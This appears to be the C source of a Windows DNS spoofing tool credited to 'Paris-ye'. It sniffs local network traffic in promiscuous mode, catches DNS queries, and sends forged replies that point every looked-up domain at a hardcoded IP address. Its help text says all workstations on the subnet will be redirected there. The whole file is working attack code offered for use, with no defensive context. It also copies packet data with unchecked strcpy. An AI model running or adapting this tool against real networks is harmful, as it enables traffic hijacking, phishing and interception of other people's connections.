/*============================================================================
Coder:  Paris-ye
Test in: Win2000
Website: www.ffe4.net
Our Team:Www.Bugkidz.Org
============================================================================*/
#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <mstcpip.h>
#include <conio.h>
#pragma comment(lib,"ws2_32")
#pragma comment(lib,"wsock32")
#define MAX_PACKET 1024

//define IP header IP报文
struct iphdr 
{
	unsigned char h_verlen;
	unsigned char tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char ttl;
	unsigned char proto;
	unsigned short checksum;
	struct in_addr sourceIP;
	struct in_addr destIP;
};

//define UDP header 
struct udphdr 
{
	unsigned short  i_sourcePort;
	unsigned short  i_destPort;
	unsigned short  i_len;
	unsigned short  i_checkSum;
};				// UDP header size 8 byte

//define DNS DNS报文
struct dnshdr 
{
	unsigned short  d_id;           //16 bit DNS series
	unsigned short  d_option;       //dns option
	unsigned short  d_qdcount;      //number of question entries
	unsigned short  d_ancount;      //number of answer entries
	unsigned short  d_nscount;      //number of authority entries
	unsigned short  d_arcount;      //number of resource entries
};

struct
{
	unsigned long saddr;	//source address
	unsigned long daddr;	//destination address
	char mbz;		//NULL
	char ptcl;		//protocol type
	unsigned short udpl;	//UDP size
}PSD_HEADER; 

struct DNSAnswer
{
	unsigned short Type;
	unsigned short Class;
	unsigned short Name;
	unsigned short TypeA;
	unsigned short ClassA;
	unsigned short timeLive[2];
	unsigned short IPLen;
	unsigned int   IP;
};

char sendBuff[512];
char dnsData[256];
char payload[512];
int  payloadLen;
struct DNSAnswer dnsAnswer;
int SendDns(unsigned int sourceIP,unsigned int destIP,unsigned short updPort,unsigned short checkID);
void packet(iphdr * packetport,int packetsize);
USHORT checksum(USHORT *buffer, int size);

char * proto(int proto)
{
	static char varproto[32];
	switch(proto)
	{
	case 0:
		strcpy(varproto,"IP");
		break;
	case 1:
		strcpy(varproto,"ICMP");
		break;
	case 2:
		strcpy(varproto,"GGP");
		break;
	case 6:
		strcpy(varproto,"TCP");
		break;
	case 12:
		strcpy(varproto,"PUP");
		break;
	case 17:
		strcpy(varproto,"UDP");
		break;
	case 22:
		strcpy(varproto,"IDP");
		break;
	case 77:
		strcpy(varproto,"ND");
		break;
	case 255:
		strcpy(varproto,"RAW");
		break;
	}
	return varproto;
}

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum=0;
	while(size >1) {
		cksum+=*buffer++;
		size-=sizeof(USHORT);
	}
	if(size) cksum+=*(UCHAR*)buffer;
	cksum=(cksum >> 16)+(cksum&0xffff);
	cksum+=(cksum >>16);
	return (USHORT)(~cksum); 
}

//接收数据处理  iphdr * packetport数据内容指针,int packetsize数据长度
void packet(iphdr * packetport,int packetsize)
{
	udphdr*   udpHeader;
	dnshdr*   dnsHeader;
	udpHeader = (udphdr*)((char *)packetport+sizeof(iphdr));
	dnsHeader = (dnshdr*)((char* )udpHeader+sizeof(udphdr));
	char buffer[512];
	char* data;
	data = (char *)dnsHeader +sizeof(dnshdr);
	char len = 0;
	if(packetport->proto==17&&ntohs(udpHeader->i_destPort)==53)
	{
		printf("32 bit source IP address:%s\n",inet_ntoa(packetport->sourceIP)); //本机IP
		printf("32 bit destination IP adddress:%s\n",inet_ntoa(packetport->destIP)); //DNSIP
		printf("16 bit UDP sourece port:%d\t16 bit UDP destination port:%d\n",ntohs(udpHeader->i_sourcePort),ntohs(udpHeader->i_destPort));
		printf("16 bit DNS series:%d\t16 bit DNS control:%x\n",ntohs(dnsHeader->d_id),ntohs(dnsHeader->d_option));
		printf("DNS Questions: %d; Answer RRs: %d\n", dnsHeader->d_qdcount, dnsHeader->d_ancount);
		strcpy(payload,data);
		strcpy(buffer,data);
		buffer[0]='>';
		do{
			len += data[len];
			len++;
			if(data[len]==0)
				break;
			buffer[len]='.';
		}while(1);
		printf("access site:%s\n",buffer);
		printf("-----------------------------------\n");
		SendDns(packetport->destIP.s_addr, packetport->sourceIP.s_addr, udpHeader->i_sourcePort, dnsHeader->d_id);
	}
}
//sourceIP DNS服务器IP, destIP 本机IP, updPort, checkID
int SendDns(unsigned int sourceIP,unsigned int destIP,unsigned short updPort,unsigned short checkID)
{
	//_asm int 3;
	int   ip_size=0;
	int   udp_size=0;
	int   payload_len=0;
	iphdr ipheader;  //20字节
	udphdr udpheader; //8字节
	dnshdr dnsHeader;
	int  sockSend =0;
	int  ErrorCode=0,flag=true,TimeOut=2000;
	struct sockaddr_in addrSend;
    //初始化DNS包
	dnsAnswer.Type =0x0100;
	dnsAnswer.Class =0x0100;
	dnsAnswer.Name =0x0cc0;
	dnsAnswer.TypeA =0x0100;
	dnsAnswer.ClassA =0x0100;
	dnsAnswer.timeLive[0] = 0xff;
	dnsAnswer.IPLen =0x0400;

	memcpy(payload+strlen(payload)+1,&dnsAnswer,sizeof(DNSAnswer));
	payloadLen=strlen(payload)+1+sizeof(DNSAnswer);

	memset(&addrSend,NULL,sizeof(addrSend));
	addrSend.sin_family=AF_INET;
	addrSend.sin_addr.s_addr =destIP;
	addrSend.sin_port =0;

	sockSend = WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	setsockopt(sockSend,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));
	int s1 = setsockopt(sockSend,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));

	ip_size = sizeof(iphdr)+sizeof(udphdr)+sizeof(dnshdr)+payloadLen;
	udp_size=sizeof(udphdr)+sizeof(dnshdr)+payloadLen;

	ipheader.h_verlen=(4<<4 | sizeof(iphdr)/sizeof(unsigned long));
	ipheader.total_len = htons(ip_size);
	ipheader.ident = 1;
	ipheader.frag_and_flags = 0;
	ipheader.ttl = 128;
	ipheader.proto = IPPROTO_UDP;
	ipheader.checksum =0;
	ipheader.sourceIP.S_un.S_addr = sourceIP;
	ipheader.destIP.S_un.S_addr = destIP;

	udpheader.i_sourcePort = htons(53);
	udpheader.i_destPort  = updPort;
	udpheader.i_checkSum = 0;
	udpheader.i_len = htons(udp_size);

	dnsHeader.d_id = checkID;
	dnsHeader.d_option = htons(0X8580);
	dnsHeader.d_qdcount =htons(1);
	dnsHeader.d_ancount =htons(1);
	dnsHeader.d_arcount =htons(0);
	dnsHeader.d_nscount =htons(0);

	PSD_HEADER.saddr=ipheader.sourceIP.S_un.S_addr;
	PSD_HEADER.daddr=ipheader.destIP.S_un.S_addr;
	PSD_HEADER.mbz=0;
	PSD_HEADER.ptcl=IPPROTO_UDP;
	PSD_HEADER.udpl=htons(udp_size);

	memset(sendBuff,NULL,sizeof(sendBuff));

	memcpy(sendBuff,&PSD_HEADER,sizeof(PSD_HEADER));
	memcpy(sendBuff+sizeof(PSD_HEADER),&udpheader,sizeof(udphdr)); //复制UDP报文
	memcpy(sendBuff+sizeof(PSD_HEADER)+sizeof(udphdr),&dnsHeader,sizeof(dnshdr));//DNS报文 头
	memcpy(sendBuff+sizeof(PSD_HEADER)+sizeof(udphdr)+sizeof(dnshdr),payload,payloadLen);//DNS报文回复内容
	udpheader.i_checkSum = checksum((unsigned short *)sendBuff,sizeof(PSD_HEADER)+sizeof(udphdr)+sizeof(dnshdr)+payloadLen);

	memcpy(sendBuff,&ipheader,sizeof(iphdr));
	memcpy(sendBuff+sizeof(iphdr),&udpheader,sizeof(udphdr));
	memcpy(sendBuff+sizeof(iphdr)+sizeof(udphdr),&dnsHeader,sizeof(dnshdr));
	memcpy(sendBuff+sizeof(iphdr)+sizeof(udphdr)+sizeof(dnshdr),payload,payloadLen);
	ipheader.checksum = checksum((unsigned short *)sendBuff,sizeof(iphdr)+sizeof(udphdr)+sizeof(dnshdr)+payloadLen);
	memcpy(sendBuff,&ipheader,sizeof(iphdr));

	sendto(sockSend,sendBuff,ip_size,0,(struct sockaddr*) &addrSend,sizeof(addrSend));

	return 1;
}
int main(int argc,char *argv[])
{
	WSADATA wsaData;
	struct sockaddr_in sockAddr;
	int sockMain;
	int rcvtimeo = 10000;
	char recvbuf[MAX_PACKET+1];
	int packlen=0;
	DWORD dwBufferInLen=100;
	DWORD dwBufferLen[10];
	DWORD dwBytesReturned=0;
	payloadLen = 0;
	printf("-----------------Write by Paris-ye-----------------\n");
	printf("++++++++++++++++++Version 1.0++++++++++++++++++++\n");
	if(argc<3)
	{
		printf("HELP    :%s [Self IP] [forward IP]\n",argv[0]);
		printf("Example :%s 192.168.30.124 220.181.111.86\n",argv[0]);
		printf("\tFor this example say, my IP is 192.168.30.124 and all of the subnet workstations will be forwarding to IP 220.181.111.86:)\n",argv[0]);
		printf("This program must run in HUB environment(I tested it on win2000 or later version).\n");
		//return 1;
	}
	//dnsAnswer.IP =inet_addr(argv[2]);
	dnsAnswer.IP =inet_addr("220.181.111.86");

	WSAStartup(MAKEWORD(2,1),&wsaData);
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port = htons(9337);
	//sockAddr.sin_addr.s_addr = inet_addr(argv[1]);
	 sockAddr.sin_addr.s_addr = inet_addr("192.168.30.124");
	sockMain=socket(AF_INET,SOCK_RAW,IPPROTO_IP);//创建套接字
	setsockopt(sockMain,SOL_SOCKET,SO_RCVTIMEO,(const char*)&rcvtimeo,sizeof(rcvtimeo));
	bind(sockMain,(PSOCKADDR)&sockAddr,sizeof(sockAddr));
	WSAIoctl(sockMain,SIO_RCVALL,&dwBufferInLen,sizeof(dwBufferInLen),&dwBufferLen, sizeof(dwBufferLen),&dwBytesReturned,NULL,NULL);
	while(1)
	{
		packlen=recv(sockMain,recvbuf,MAX_PACKET,0);
		if(packlen>0)
		{
			packet((iphdr *)recvbuf,packlen);
			packlen=0;
		}
	}
	WSACleanup();
	return 0;
}

